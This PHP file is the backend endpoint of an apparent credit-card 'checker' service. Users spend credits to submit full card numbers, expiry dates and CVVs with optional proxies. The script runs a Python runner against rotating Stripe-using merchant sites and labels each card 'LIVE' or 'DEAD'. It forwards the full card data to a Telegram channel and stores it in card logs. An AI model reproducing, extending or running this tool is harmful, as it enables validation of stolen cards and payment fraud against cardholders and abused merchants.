<?php
ini_set('display_errors', 0);
error_reporting(0);

require_once 'config.php';
require_once 'database.php';
require_once 'auth.php';
require_once 'owner_logger.php';
require_once 'cc_logs_manager.php';
require_once 'utils.php';
require_once 'stripe_auth_sites.php';

header('Content-Type: application/json');

function respond(array $payload, int $code = 200): void
{
    http_response_code($code);
    echo json_encode($payload);
    exit;
}

try {
    initSecureSession();

    if (!isset($_SESSION['user_id']) && !isset($_SESSION['telegram_id'])) {
        respond([
            'success' => false,
            'status' => 'AUTH_REQUIRED',
            'message' => 'Authentication required. Please login again.',
        ], 401);
    }

    $telegramId = $_SESSION['telegram_id'] ?? $_SESSION['user_id'];
    $db = Database::getInstance();
    $user = $db->getUserByTelegramId($telegramId);

    if (!$user) {
        respond([
            'success' => false,
            'status' => 'USER_NOT_FOUND',
            'message' => 'User profile not found.',
        ], 404);
    }

    $isOwner = in_array($telegramId, AppConfig::OWNER_IDS, true);

    $rawInput = file_get_contents('php://input');
    $payload = json_decode($rawInput, true);
    if (!is_array($payload)) {
        $payload = $_POST;
    }

    $cardRaw = trim((string) ($payload['card'] ?? ''));
    $proxyRaw = trim((string) ($payload['proxy'] ?? ''));

    if ($cardRaw === '') {
        respond([
            'success' => false,
            'status' => 'INVALID_REQUEST',
            'message' => 'Please provide a card in the format cc|mm|yyyy|cvv.',
        ], 400);
    }

    $cardParts = array_map('trim', explode('|', $cardRaw));
    if (count($cardParts) !== 4) {
        respond([
            'success' => false,
            'status' => 'INVALID_CARD_FORMAT',
            'message' => 'Card must be in cc|mm|yyyy|cvv format.',
        ], 400);
    }

    [$cardNumber, $cardMonth, $cardYear, $cardCvv] = $cardParts;
    if (!preg_match('/^\d{13,19}$/', $cardNumber) ||
        !preg_match('/^(0[1-9]|1[0-2])$/', $cardMonth) ||
        !preg_match('/^\d{2}(\d{2})?$/', $cardYear) ||
        !preg_match('/^\d{3,4}$/', $cardCvv)
    ) {
        respond([
            'success' => false,
            'status' => 'INVALID_CARD_FORMAT',
            'message' => 'Please provide a valid card number, expiry, and CVV.',
        ], 400);
    }

    $cardDisplay = $cardNumber . '|' . $cardMonth . '|' . $cardYear . '|' . $cardCvv;
    $maskedCard = substr($cardNumber, 0, 6) . str_repeat('*', max(strlen($cardNumber) - 10, 4)) . substr($cardNumber, -4);

    if (!$isOwner) {
        $currentCredits = (int) ($user['credits'] ?? 0);
        if ($currentCredits < 1) {
            respond([
                'success' => false,
                'status' => 'INSUFFICIENT_CREDITS',
                'message' => 'Insufficient credits. You need at least 1 credit to run this check.',
            ], 402);
        }

        if (!$db->deductCredits($telegramId, 1)) {
            respond([
                'success' => false,
                'status' => 'INSUFFICIENT_CREDITS',
                'message' => 'Unable to deduct credits at this time. Please try again.',
            ], 402);
        }

        // Refresh user balance after deduction
        $user = $db->getUserByTelegramId($telegramId) ?: $user;
    }

    $site = StripeAuthSites::getNextSite();

    $pythonBinary = AppConfig::PYTHON_BINARY ?? 'python3';
    $pythonCmd = escapeshellcmd($pythonBinary);
    $scriptPath = escapeshellarg(__DIR__ . '/stripe_auth_runner.py');
    $domainArg = escapeshellarg($site);
    $cardArg = escapeshellarg($cardDisplay);
    $command = "{$pythonCmd} {$scriptPath} {$domainArg} {$cardArg}";
    if ($proxyRaw !== '') {
        $command .= ' ' . escapeshellarg($proxyRaw);
    }

    $descriptorspec = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $startTime = microtime(true);
    $process = proc_open($command, $descriptorspec, $pipes, __DIR__);
    if (!is_resource($process)) {
        throw new RuntimeException('Unable to start Stripe auth process.');
    }

    fclose($pipes[0]);
    $stdout = stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    $stderr = stream_get_contents($pipes[2]);
    fclose($pipes[2]);
    $exitCode = proc_close($process);
    $durationMs = (int) round((microtime(true) - $startTime) * 1000);

    if ($stderr !== '') {
        error_log('[StripeAuth] STDERR: ' . $stderr);
    }

    $stdout = trim((string) $stdout);
    $resultPayload = json_decode($stdout, true);
    if (!is_array($resultPayload)) {
        $resultPayload = [
            'success' => false,
            'status' => 'PROCESSING_ERROR',
            'message' => 'Unable to parse checker output.',
            'raw_output' => $stdout,
        ];
    }

    $success = !empty($resultPayload['success']);
    $statusMessage = (string) ($resultPayload['message'] ?? $resultPayload['status'] ?? '');
    $statusUpper = strtoupper((string) ($resultPayload['status'] ?? ''));

    $statusLabel = $success ? 'LIVE' : 'DEAD';
    if (
        !$success
        && (
            strpos($statusUpper, 'REQUIRES_ACTION') !== false
            || strpos($statusUpper, 'REQUIRES AUTHENTICATION') !== false
            || strpos($statusUpper, 'APPROVED') !== false
            || strpos($statusUpper, 'LIVE') !== false
        )
    ) {
        $statusLabel = 'LIVE';
    }

    $remainingCredits = (int) ($user['credits'] ?? 0);

    // Prepare Telegram notification
    try {
        $logo = $statusLabel === 'LIVE' ? '✅' : '❌';
        $durationSeconds = number_format($durationMs / 1000, 2);
        $telegramMessage = "<b>Stripe Auth Check</b>\n\n"
            . "👤 <b>User ID:</b> {$telegramId}\n"
            . "💳 <b>Card:</b> <code>{$cardDisplay}</code>\n"
            . "🌐 <b>Site:</b> " . htmlspecialchars($site, ENT_QUOTES, 'UTF-8') . "\n"
            . "📣 <b>Response:</b> " . htmlspecialchars($statusMessage, ENT_QUOTES, 'UTF-8') . "\n"
            . "🟩 <b>Status:</b> {$statusLabel} {$logo}\n"
            . "⏱️ <b>Time:</b> {$durationSeconds}s";
        sendTelegramHtml($telegramMessage);
    } catch (Exception $e) {
        error_log('[StripeAuth] Telegram notification failed: ' . $e->getMessage());
    }

    // Owner activity log
    try {
        $ownerLogger = new OwnerLogger();
        $ownerLogger->sendUserActivity(
            $user,
            'Stripe Auth',
            "Card: {$maskedCard} ({$cardMonth}/{$cardYear}) on " . parse_url($site, PHP_URL_HOST) . " - Result: {$statusLabel}"
        );
    } catch (Exception $e) {
        error_log('[StripeAuth] Owner logging failed: ' . $e->getMessage());
    }

    // Persist CC log
    try {
        $ccLogger = new CCLogsManager();
        $ccLogger->logCCCheck([
            'telegram_id' => $telegramId,
            'username' => $user['username'] ?? 'Unknown',
            'card_number' => $cardDisplay,
            'card_full' => $cardDisplay,
            'status' => strtolower($statusLabel),
            'message' => $statusMessage,
            'gateway' => 'stripe_auth',
            'amount' => $resultPayload['raw_response_json']['amount'] ?? '0',
            'proxy_status' => $proxyRaw !== '' ? 'Provided' : 'Not used',
            'proxy_ip' => $resultPayload['raw_response_json']['proxy_ip'] ?? 'N/A',
        ]);
    } catch (Exception $e) {
        error_log('[StripeAuth] CC logging failed: ' . $e->getMessage());
    }

    $response = [
        'success' => $success,
        'status_label' => $statusLabel,
        'status' => $resultPayload['status'] ?? ($success ? 'SUCCESS' : 'FAILED'),
        'message' => $statusMessage,
        'site' => $site,
        'duration_ms' => $durationMs,
        'card' => $cardDisplay,
        'card_masked' => $maskedCard,
        'account_email' => $resultPayload['account_email'] ?? null,
        'pm_id' => $resultPayload['pm_id'] ?? null,
        'raw_response' => $resultPayload['raw_response'] ?? null,
        'raw_response_json' => $resultPayload['raw_response_json'] ?? null,
        'credits_deducted' => $isOwner ? 0 : 1,
        'remaining_credits' => $remainingCredits,
        'rotation' => StripeAuthSites::getRotationState(),
        'stderr' => $stderr !== '' ? $stderr : null,
        'exit_code' => $exitCode,
    ];

    respond($response);
} catch (Throwable $e) {
    error_log('[StripeAuth] Fatal error: ' . $e->getMessage());
    respond([
        'success' => false,
        'status' => 'SYSTEM_ERROR',
        'message' => 'Unexpected error: ' . $e->getMessage(),
    ], 500);
}
